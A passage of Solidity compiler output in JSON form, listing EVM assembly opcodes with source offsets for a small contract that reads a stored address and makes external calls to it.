											"end": 567,
											"name": "DUP1"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "SWAP1"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "SLOAD"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "SWAP1"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "EXP"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "SWAP1"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "DIV"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "AND"
										},
										{
											"begin": 566,
											"end": 576,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 566,
											"end": 576,
											"name": "AND"
										},
										{
											"begin": 566,
											"end": 576,
											"name": "PUSH",
											"value": "2E1A7D4D"
										},
										{
											"begin": 577,
											"end": 583,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 577,
											"end": 583,
											"name": "SLOAD"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "MLOAD"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP3"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "AND"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "SHL"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP2"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "MSTORE"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "ADD"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP1"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP3"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP2"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "MSTORE"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "ADD"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "SWAP2"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "POP"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "POP"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "MLOAD"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP1"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP4"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "SUB"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP2"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP8"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "DUP1"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "POP"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "GAS"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "CALL"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "POP"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "POP"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "POP"
										},
										{
											"begin": 566,
											"end": 584,
											"name": "POP"
										},
										{
											"begin": 522,
											"end": 596,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 522,
											"end": 596,
											"name": "JUMPDEST"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "STOP"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMPDEST"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "DUP1"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "REVERT"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "POP"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "MLOAD"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "DUP3"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "AND"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "AND"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "DUP2"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "MSTORE"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "ADD"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "SWAP2"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "POP"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "POP"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "MLOAD"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "SWAP2"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "SUB"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "SWAP1"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "RETURN"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "JUMPDEST"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "POP"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "JUMPDEST"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "STOP"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "JUMPDEST"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "POP"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "JUMPDEST"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "MLOAD"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "DUP1"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "DUP3"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "DUP2"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "MSTORE"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "ADD"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "SWAP2"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "POP"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "POP"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "MLOAD"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "DUP1"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "SWAP2"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "SUB"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "SWAP1"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "RETURN"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "JUMPDEST"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "JUMPDEST"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "STOP"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "SWAP1"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "SLOAD"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "SWAP1"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "EXP"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "SWAP1"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "DIV"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "AND"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "DUP2"
										},
										{
											"begin": 111,
											"end": 187,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "JUMPDEST"
										},
										{
											"begin": 373,
											"end": 385,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 387,
											"end": 406,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "DUP1"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "SLOAD"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "EXP"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "DIV"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "AND"
										},
										{
											"begin": 410,
											"end": 425,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 410,
											"end": 425,
											"name": "AND"
										},
										{
											"begin": 468,
											"end": 471,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "MLOAD"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "ADD"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "DUP1"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "DUP3"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "AND"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "DUP2"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "MSTORE"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "ADD"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "SWAP2"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "POP"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "POP"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2"
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "SWAP1"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "MSTORE"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "PUSH",
											"value": "8BA1456200000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "NOT"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "AND"
										},
										{
											"begin": 38,
											"end": 42,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 29,
											"end": 36,
											"name": "DUP3"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD"
										},
										{
											"begin": 67,
											"end": 77,
											"name": "DUP1"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD"
										},
										{
											"begin": 96,
											"end": 154,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 199,
											"end": 207,
											"name": "DUP4"
										},
										{
											"begin": 192,
											"end": 196,
											"name": "DUP2"
										},
										{
											"begin": 186,
											"end": 190,
											"name": "DUP4"
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND"
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR"
										},
										{
											"begin": 167,
											"end": 177,
											"name": "DUP4"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 426,
											"end": 472,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "MLOAD"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP1"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP3"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP1"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "MLOAD"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "SWAP1"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "ADD"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "SWAP1"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP1"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP4"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP4"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4"
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI"
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD"
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE"
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP"
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2"
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD"
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1"
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP"
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB"
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3"
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4"
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB"
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP"
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB"
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1"
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT"
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3"
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD"
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND"
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2"
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5"
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD"
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1"
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3"
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR"
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6"
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "SWAP1"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "ADD"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "SWAP2"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "MLOAD"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP1"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP4"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "SUB"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP2"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "DUP7"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "GAS"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "CALL"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "SWAP2"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 410,
											"end": 473,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI"
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD"
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2"
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP"
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT"
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD"
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND"
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3"
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE"
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3"
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE"
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5"
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD"
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST"
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP"
										},
										{
											"begin": 372,
											"end": 473,
											"name": "SWAP2"
										},
										{
